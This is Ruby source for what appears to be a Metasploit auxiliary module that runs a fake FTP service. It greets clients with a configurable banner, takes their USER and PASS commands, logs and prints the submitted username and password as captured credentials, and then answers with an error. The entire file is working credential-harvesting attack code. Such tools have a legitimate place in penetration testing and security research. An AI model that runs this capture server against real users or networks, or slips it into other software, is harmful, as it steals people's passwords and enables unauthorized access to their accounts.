##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Authentication Capture: FTP',
      'Description' => %q{
          This module provides a fake FTP service that
        is designed to capture authentication credentials.
      },
      'Author' => ['ddz', 'hdm'],
      'License' => MSF_LICENSE,
      'Actions' => [
        [ 'Capture', { 'Description' => 'Run FTP capture server' } ]
      ],
      'PassiveActions' => [
        'Capture'
      ],
      'DefaultAction' => 'Capture',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 21 ]),
        OptString.new('BANNER', [ true, 'The server banner', 'FTP Server Ready'])
      ]
    )
  end

  def setup
    super
    @state = {}
  end

  def run
    exploit
  end

  def on_client_connect(client)
    @state[client] = { name: "#{client.peerhost}:#{client.peerport}", ip: client.peerhost, port: client.peerport, user: nil, pass: nil }
    client.put "220 #{datastore['BANNER']}\r\n"
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_data(client)
    data = client.get_once
    return if !data

    cmd, arg = data.strip.split(/\s+/, 2)
    arg ||= ''

    if (cmd.upcase == 'USER')
      @state[client][:user] = arg
      client.put "331 User name okay, need password...\r\n"
      return
    end

    if (cmd.upcase == 'QUIT')
      client.put "221 Logout\r\n"
      return
    end

    if (cmd.upcase == 'PASS')
      @state[client][:pass] = arg

      report_cred(
        ip: @state[client][:ip],
        port: datastore['SRVPORT'],
        service_name: 'ftp',
        user: @state[client][:user],
        password: @state[client][:pass],
        proof: arg
      )

      print_good("FTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
    end

    @state[client][:pass] = data.strip
    client.put "500 Error\r\n"
    return
  end

  def on_client_close(client)
    @state.delete(client)
  end

end
